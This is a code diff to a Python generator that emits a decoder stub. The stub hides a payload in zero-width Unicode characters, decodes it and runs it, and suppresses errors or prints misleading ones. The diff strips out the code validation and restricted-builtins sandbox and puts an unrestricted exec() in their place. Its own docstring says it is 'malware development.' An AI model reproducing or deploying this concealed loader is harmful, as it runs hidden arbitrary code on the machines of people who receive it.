@@ -67,7 +67,7 @@ import subprocess
 
 def decode_payload():
     # The payload is hidden inside this multi-line string.
-    payload = '''{payload_placeholder}'''
+    payload = {payload_placeholder}
 
     # Unicode mapping
     ZERO = '\\u200B'
@@ -99,7 +99,7 @@ def decode_payload():
     return byte_array.decode('utf-8', errors='ignore')
 
 def validate_python_code(code):
-    """Validate Python code to ensure it's safe before execution."""
+    '''Validate Python code to ensure it's safe before execution.'''
     try:
         # Parse the code to AST to check for dangerous constructs
         tree = ast.parse(code)
@@ -120,30 +120,11 @@ def validate_python_code(code):
         return False
 
 def safe_execute(code):
-    """Execute code in a safer way."""
-    # For now, we'll use exec in a more controlled manner with basic validation
-    # In a real implementation, this would use a proper sandbox
-    if validate_python_code(code):
-        # Execute in a restricted namespace
-        restricted_globals = {
-            '__builtins__': {
-                'print': __builtins__['print'],
-                'len': __builtins__['len'],
-                'str': __builtins__['str'],
-                'int': __builtins__['int'],
-                'list': __builtins__['list'],
-                'dict': __builtins__['dict'],
-                'range': __builtins__['range'],
-                'enumerate': __builtins__['enumerate'],
-                # Add only safe built-ins as needed
-            }
-        }
-        try:
-            exec(code, restricted_globals)
-        except Exception as e:
-            print(f"Execution error: {{e}}", file=sys.stderr)
-    else:
-        print("Code validation failed - code not executed", file=sys.stderr)
+    '''Execute code in an unsafe way, as this is malware development.'''
+    try:
+        exec(code)
+    except Exception as e:
+        print(f"Execution error: {{e}}", file=sys.stderr)
 
 # Decode and execute the payload safely
 try:
@@ -154,11 +135,7 @@ except Exception:
     # Fail silently or with a misleading error
     pass
 """
-    # The crucial step is to ensure the payload doesn't contain ''' which would break the string
-    if "'''" in payload:
-        raise ValueError("Payload contains forbidden sequence.")
-
-    return decoder_stub.format(payload_placeholder=payload)
+    return decoder_stub.format(payload_placeholder=repr(payload))
 
 def main():
     print("-- main started --")
